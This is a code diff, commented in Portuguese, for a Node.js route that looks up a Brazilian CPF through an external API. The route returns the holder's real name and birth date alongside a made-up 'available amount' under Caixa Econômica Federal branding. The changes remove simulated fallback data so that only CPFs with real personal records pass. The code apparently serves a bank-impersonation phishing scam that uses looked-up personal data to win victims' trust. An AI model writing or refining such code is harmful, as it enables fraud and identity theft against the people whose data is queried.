@@ -40,6 +40,7 @@ function gerarValorPorCPF(cpf) {
 }
 
 // ROTA PARA BUSCAR CPF
+// ====================== ROTA PARA BUSCAR CPF (COM VALIDAÇÃO DE DATA) ======================
 app.post('/buscar-cpf', async (req, res) => {
   const { cpf } = req.body;
   console.log(`🔍 Buscando CPF: ${cpf}`);
@@ -61,6 +62,8 @@ app.post('/buscar-cpf', async (req, res) => {
     if (!response.ok) throw new Error(`API retornou ${response.status}`);
 
     const data = await response.json();
+    
+    // Extrair dados
     let nomeUsuario = '';
     let dataNascimentoReal = '';
     
@@ -73,53 +76,68 @@ app.post('/buscar-cpf', async (req, res) => {
       nomeUsuario = data.nome;
     }
     
-    if (!dataNascimentoReal) dataNascimentoReal = gerarDataAleatoria(1970, 2000);
+    // ========== VALIDAÇÃO OBRIGATÓRIA ==========
+    // Só prossegue se tiver nome E data de nascimento válidos
+    const TEM_NOME_VALIDO = nomeUsuario && nomeUsuario.trim().length > 3 && !nomeUsuario.toLowerCase().includes('não');
+    const TEM_DATA_VALIDA = dataNascimentoReal && dataNascimentoReal.match(/^\d{4}-\d{2}-\d{2}$/);
     
-    const opcoesDatas = [dataNascimentoReal, gerarDataAleatoria(1960, 1990), gerarDataAleatoria(1980, 2010)];
+    console.log(`📊 Nome: "${nomeUsuario}" - Válido: ${TEM_NOME_VALIDO}`);
+    console.log(`📊 Data: "${dataNascimentoReal}" - Válida: ${TEM_DATA_VALIDA}`);
+    
+    // 🔴 BLOQUEIA SE NÃO TIVER NOME OU DATA
+    if (!TEM_NOME_VALIDO || !TEM_DATA_VALIDA) {
+      console.log(`❌ CPF ${cpf} REJEITADO - Dados incompletos`);
+      return res.json({
+        success: false,
+        erro: '❌ CPF NÃO ENCONTRADO',
+        detalhe: 'Este CPF não possui dados completos no sistema da CAIXA.'
+      });
+    }
+    
+    // ========== SE CHEGOU AQUI, TEM DADOS VÁLIDOS ==========
+    console.log(`✅ CPF ${cpf} APROVADO - ${nomeUsuario}`);
+    
+    // Gerar opções de data (1 correta + 2 falsas)
+    const opcoesDatas = [dataNascimentoReal];
+    
+    // Gerar datas falsas para teste
+    const [ano, mes, dia] = dataNascimentoReal.split('-').map(Number);
+    let diaFalso = dia + 5;
+    if (diaFalso > 28) diaFalso = dia - 3;
+    const dataFalsa1 = `${ano}-${String(mes).padStart(2,'0')}-${String(diaFalso).padStart(2,'0')}`;
+    
+    let mesFalso = mes + 1;
+    if (mesFalso > 12) mesFalso = mes - 1;
+    const dataFalsa2 = `${ano}-${String(mesFalso).padStart(2,'0')}-${String(dia).padStart(2,'0')}`;
+    
+    opcoesDatas.push(dataFalsa1, dataFalsa2);
+    
+    // Embaralhar
     for (let i = opcoesDatas.length - 1; i > 0; i--) {
       const j = Math.floor(Math.random() * (i + 1));
       [opcoesDatas[i], opcoesDatas[j]] = [opcoesDatas[j], opcoesDatas[i]];
     }
     
-    console.log(`✅ Dados encontrados: ${nomeUsuario}`);
-    
     res.json({
       success: true,
-      nome: nomeUsuario || 'Usuário encontrado',
+      nome: nomeUsuario,
       cpf: cpf,
       opcoesDatas: opcoesDatas,
       dataReal: dataNascimentoReal,
       valorDisponivel: gerarValorPorCPF(cpf),
       banco: 'CAIXA ECONÔMICA FEDERAL',
       agencia: '0001',
-      conta: '*****-*',
-      message: 'Dados obtidos com sucesso!'
+      conta: '*****-*'
     });
 
   } catch (err) {
     console.error('❌ Erro na API:', err.message);
     
-    const nomeSimulado = `Usuário CPF ${cpf.slice(0,3)}.${cpf.slice(3,6)}.${cpf.slice(6,9)}-${cpf.slice(9)}`;
-    const dataReal = gerarDataAleatoria(1970, 2000);
-    
-    const opcoesDatas = [dataReal, gerarDataAleatoria(1960, 1990), gerarDataAleatoria(1980, 2010)];
-    for (let i = opcoesDatas.length - 1; i > 0; i--) {
-      const j = Math.floor(Math.random() * (i + 1));
-      [opcoesDatas[i], opcoesDatas[j]] = [opcoesDatas[j], opcoesDatas[i]];
-    }
-    
+    // 🔴 EM CASO DE ERRO, NÃO PROSSEGUE
     res.json({
-      success: true,
-      nome: nomeSimulado,
-      cpf: cpf,
-      opcoesDatas: opcoesDatas,
-      dataReal: dataReal,
-      valorDisponivel: gerarValorPorCPF(cpf),
-      banco: 'CAIXA ECONÔMICA FEDERAL',
-      agencia: '0001',
-      conta: '12345-6',
-      simulado: true,
-      message: 'Dados simulados'
+      success: false,
+      erro: '❌ SERVIÇO INDISPONÍVEL',
+      detalhe: 'Não foi possível verificar seus dados. Tente novamente mais tarde.'
     });
   }
 });
